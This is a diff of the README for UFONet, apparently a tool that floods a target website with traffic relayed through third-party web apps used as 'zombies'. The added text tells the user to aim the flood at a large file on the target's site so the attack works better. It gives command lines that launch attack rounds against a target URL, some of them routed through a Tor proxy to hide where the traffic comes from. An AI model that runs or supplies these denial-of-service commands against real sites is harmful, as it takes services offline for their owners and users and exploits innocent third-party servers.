@@ -49,7 +49,7 @@ On Debian-based systems (ex: Ubuntu), run:
 Open 'zombies.txt' (or another file) and create a list of possible 'zombies'. Urls of the
 'zombies' should be like this:
 
-       http://validator.w3.org/check?uri=
+       http://target.com/check?uri=
 
 After that, launch it:
 
@@ -64,7 +64,7 @@ adding only 'vulnerable' web apps.
 Examples:
 
    + with verbose:     ./ufonet -t zombies.txt -v
-   + with proxy TOR:   ./ufonet -t zombies.txt -v --proxy="http://127.0.0.1:8118"
+   + with proxy TOR:   ./ufonet -t zombies.txt --proxy="http://127.0.0.1:8118"
 
 ###############################
 # Attacking a target
@@ -80,19 +80,32 @@ launch 1.000 'zombies' x 10 rounds = 10.000 'hits' to the target.
 
 By default, if you don't put any round, it will apply only 1.
 
+Additionally, you can choose a place to recharge on target's site. For example, a large image, a big size
+file or a flash movie. In some scenarios where targets doesn't use cache systems, this will do the attack 
+more effective.
+
+       ./ufonet -a http://target.com -b "/images/big_size_image.jpg"
+
 -------------
 Examples:
 
    + with verbose:     ./ufonet -a http://target.com -r 10 -v
-   + with proxy TOR:   ./ufonet -a http://target.com -r 10 -v --proxy="http://127.0.0.1:8118"
+   + with proxy TOR:   ./ufonet -a http://target.com -r 10 --proxy="http://127.0.0.1:8118"
+   + with a place:     ./ufonet -a http://target.com -r 10 -b "/images/big_size_image.jpg"
 
 ###############################
 # Changelog
 ###############################
 
-----------------------
-18.06.2012
+--------------------------
+22.06.2013
+
+Second release: v.0.2b
+--------------------------
+
+--------------------------
+18.06.2013
 
 First release: v.0.1b
----------------------
+--------------------------
 
